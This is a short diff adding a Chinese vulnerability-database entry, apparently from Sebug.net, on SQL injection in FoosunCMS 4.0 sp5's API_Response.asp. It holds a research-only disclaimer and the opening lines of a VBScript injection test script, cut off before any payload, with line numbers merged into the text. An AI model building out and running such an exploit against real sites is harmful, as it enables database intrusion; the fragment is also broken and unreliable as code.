@@ -1,0 +1,6 @@
+风讯API_Response.asp注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.Rem -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-2.Rem   风讯4.0 sp5[mssql] 注入漏洞测试脚本 By Tr4c3[at]126[dot]com3.Dim strData, strUrl, strGetinfo, xPost4.strData =&n
